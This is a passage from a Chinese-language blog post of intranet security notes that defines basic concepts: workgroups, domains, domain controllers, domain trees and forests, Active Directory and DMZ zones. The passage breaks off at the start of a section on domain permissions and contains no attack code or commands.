<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="内网笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="内网笔记">
<meta property="og:url" content="https://apsry.github.io/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="apsry">
<meta property="og:description" content="内网笔记">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309204645282.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309204949328.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309205223810.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309222012817.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111655339.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111656122.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111656686.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-97e8ed747736ee0adb9c1ba4549df0f4_720w.jpg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-97e8ed747736ee0adb9c1ba4549df0f4_720w.jpg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-be6802a0028f08ab1ac00e8d80aafa13_720w.jpg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-be6802a0028f08ab1ac00e8d80aafa13_720w.jpg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-90f05b574fe3d135f6f4eaf68c3747d0_720w.jpg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-90f05b574fe3d135f6f4eaf68c3747d0_720w.jpg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-2da20061717a1d95915bfa16a1406391_720w.jpg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/v2-2da20061717a1d95915bfa16a1406391_720w.jpg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111657244.png">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/23335085-294d85d8d092dd1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/734/format/webp">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111658041.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111659186.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111659801.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220310175959204.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700128.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700456.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700937.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700699.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700574.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700022.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700776.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700620.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700305.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700109.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700651.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111700028.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701710.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701372.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701537.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701302.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701706.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701204.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701170.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701810.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701867.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701684.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701603.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111701206.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702402.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702137.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702833.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702363.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702292.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702808.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702266.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702661.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702211.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702835.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702401.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111702963.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703242.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703861.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703944.png">
<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
<meta property="og:image" content="https://common.cnblogs.com/images/copycode.gif">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703872.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703819.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703981.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703000.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703919.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703030.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703949.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111703678.png">
<meta property="og:image" content="https://pic1.zhimg.com/v2-486386cef09037a08d8bd485138052d2_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-486386cef09037a08d8bd485138052d2_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pica.zhimg.com/v2-bb57389676e8164941d1c87a2edae444_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-bb57389676e8164941d1c87a2edae444_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/v2-797d2f7292903d4042ea4f225bc81c8e_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-797d2f7292903d4042ea4f225bc81c8e_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/v2-5080aa9b4f7113e650e23683f2bc8911_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-5080aa9b4f7113e650e23683f2bc8911_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic3.zhimg.com/v2-8778e16ae26c2ce0a7f6b4d6bcb91a4b_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic3.zhimg.com/80/v2-8778e16ae26c2ce0a7f6b4d6bcb91a4b_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704545.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704305.jpeg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704072.jpeg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704478.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704421.jpeg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704364.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704582.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705720.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705893.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705005.jpeg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705246.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705579.jpeg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705891.jpeg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705188.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705428.jpeg">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705773.jpeg">
<meta property="og:image" content="https://pic1.zhimg.com/v2-ee848ffd69b49de9b2bc72f1488e01e5_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-ee848ffd69b49de9b2bc72f1488e01e5_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic4.zhimg.com/v2-c1f4db333cdf3826461c499c6679c693_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic4.zhimg.com/80/v2-c1f4db333cdf3826461c499c6679c693_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pica.zhimg.com/v2-6e908b86855301163b5fd7b3e32f17e4_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-6e908b86855301163b5fd7b3e32f17e4_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pica.zhimg.com/v2-da68442a64a29bfbf195ebfdfdf00723_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-da68442a64a29bfbf195ebfdfdf00723_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/v2-e9dacdba9b63a6a57f785e0691ab4809_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-e9dacdba9b63a6a57f785e0691ab4809_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pica.zhimg.com/v2-fe639a342c864e23e6ecc360d334f240_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-fe639a342c864e23e6ecc360d334f240_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/v2-ae594eab710f3508fc4a6677536398a0_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-ae594eab710f3508fc4a6677536398a0_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/v2-17aab8a921cfedeadd653f12de440f9f_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-17aab8a921cfedeadd653f12de440f9f_720w.jpg?source=3af55fa1">
<meta property="og:image" content="https://pic1.zhimg.com/v2-3f4cc3a3ed4197ca7861c36253a2367a_720w.jpg?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-3f4cc3a3ed4197ca7861c36253a2367a_720w.jpg?source=d16d100b">
<meta property="og:image" content="https://pic3.zhimg.com/v2-67629c31193cb3da4fe6202c9a071f0e_720w.jpg?source=d16d100b">
<meta property="og:image" content="https://pic3.zhimg.com/80/v2-67629c31193cb3da4fe6202c9a071f0e_720w.jpg?source=d16d100b">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995329-754146-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995527-217032-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995534-457308-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995553-108130-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995605-909357-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995615-966153-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995634-209962-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995646-60179-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995657-865749-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995681-882230-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995698-111867-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995711-431791-image.png">
<meta property="og:image" content="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-24/1642995722-703721-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995733-68515-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995744-540260-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995751-115259-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995756-800285-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111711.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111976.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111060.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111027.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111350.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111378.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995824-299239-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995831-613157-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995848-180356-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995857-995048-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995865-198699-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995875-275666-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995882-883710-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995893-285294-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995920-701017-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995946-803021-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995954-114822-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995960-720803-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995968-949523-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995979-523341-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996006-813298-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996014-193247-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996022-70539-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996033-818900-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996044-182676-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996053-90546-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996062-570634-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996072-403612-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996080-117106-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996090-30273-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996100-81900-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996109-765620-image.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996121-804645-image.png">
<meta property="article:published_time" content="2022-03-11T07:26:00.000Z">
<meta property="article:modified_time" content="2022-03-11T09:06:02.551Z">
<meta property="article:author" content="apsry">
<meta property="article:tag" content="web渗透">
<meta property="article:tag" content="内网">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220309204645282.png">

<link rel="canonical" href="https://apsry.github.io/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>内网笔记 | apsry</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>
<!-- 引入目录截取js -->
<script type="text/javascript" src="/js/src/abstract.js"></script>


<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">apsry</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="apsry">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="apsry">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          内网笔记
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-11 15:26:00 / 修改时间：17:06:02" itemprop="dateCreated datePublished" datetime="2022-03-11T15:26:00+08:00">2022-03-11</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">内网</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>内网笔记</p>
<span id="more"></span>





<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul>
<li><p><strong>内网：</strong>内网也指**局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理.应用软件共享.打印机共享.工作组内的历程安排.电子邮件和传真通信服务等功能。</p>
</li>
<li><p><strong>工作组：</strong>在大型单位中，如果计算机不分组的话找起计算机来非常不方便。因此有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中。（用户可以随意加入&#x2F;退出工作组，工作组并不存在真正的集中管理作用，工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的。）</p>
</li>
<li><p><strong>域：</strong>是一个有安全边界的计算机集合（<strong>安全边界</strong>意思是在两个域中，一个域中的用户无法访问另一个域中的资源），相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p>
</li>
<li><p><strong>域控制器：</strong>（Domain Controller，简写为<strong>DC</strong>）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</p>
</li>
<li><p><strong>单域：</strong>即一个域。一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。</p>
</li>
<li><p><strong>父域：</strong>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为<strong>父域</strong>，各分部的域称为该域的<strong>子域</strong>。比如大型公司的分公司在不同的地理位置，就需要建立多个域。且出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p>
</li>
<li><p><strong>域树：</strong>指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立<strong>信任关系</strong>(Trust Relation)。信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p>
</li>
<li><p><strong>域林：</strong>指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p>
</li>
<li><p><strong>DNS域名服务器：</strong>DNS域名服务器是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。•在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机.网络服务等。一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p>
</li>
<li><p><strong>活动目录：AD</strong>是域环境中提供目录服务的组件。如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，<strong>活动目录</strong>就相当于字典的<strong>索引</strong>。即<strong>活动目录存储的是网络中所有资源的快捷方式</strong>，用户通过寻找快捷方式而定位资源。</p>
</li>
<li><p><strong>目录：</strong>目录就是存储有关网络对象（如用户.组.计算机.共享资源.打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</p>
</li>
<li><p><strong>活动目录的主要功能：</strong></p>
<ul>
<li>账号集中管理。</li>
<li>软件集中管理，统一推送软件，统一安装网络打印机等。</li>
<li>环境集中管理。如统一桌面等。</li>
<li>增强安全性。统一安装杀软.集中化管理用户权限。</li>
<li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集.负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</li>
<li>活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服务都依赖于这个基础平台。</li>
</ul>
</li>
<li><p><strong>AD和DC的区别：</strong>AD库存放了网络中的众多对象的信息。将AD数据库安装在一台计算机上，这时这台计算机即为DC。</p>
</li>
<li><p><strong>安全域划分：</strong>目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略）</p>
</li>
<li><p><strong>DMZ：</strong>DMZ称为”隔离区“，也称”非军事化区“。为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。DMZ区通常位内部网络和外部网络之间的小网络区域内，DMZ区中通常部署一些公开的服务，如企业Web.FTP服务器等。</p>
</li>
<li><p><strong>DMZ的屏障功能：</strong></p>
<ul>
<li>内网可以访问外网.DMZ区。</li>
<li>外网不能访问内网。但是可以访问DMZ区。</li>
<li>DMZ不能访问内网.外网（有例外，如邮件服务。）</li>
</ul>
</li>
<li><p><strong>域中计算机分类</strong></p>
<ul>
<li><p>域控DC（必须存在）</p>
</li>
<li><p>成员服务器：安装了服务且加入到域中，没有安装AD的计算机。</p>
</li>
<li><p>客户机：普通的计算机。通过被授予权限可以访问资源。</p>
</li>
<li><p>独立服务器：不加入域，不安装AD。不能享受域提供的共享资源。可以创建工作组。</p>
<p>注：域中的各个服务器的角色也可以改变的。</p>
</li>
</ul>
</li>
<li><p><strong>域内权限解读</strong></p>
<ul>
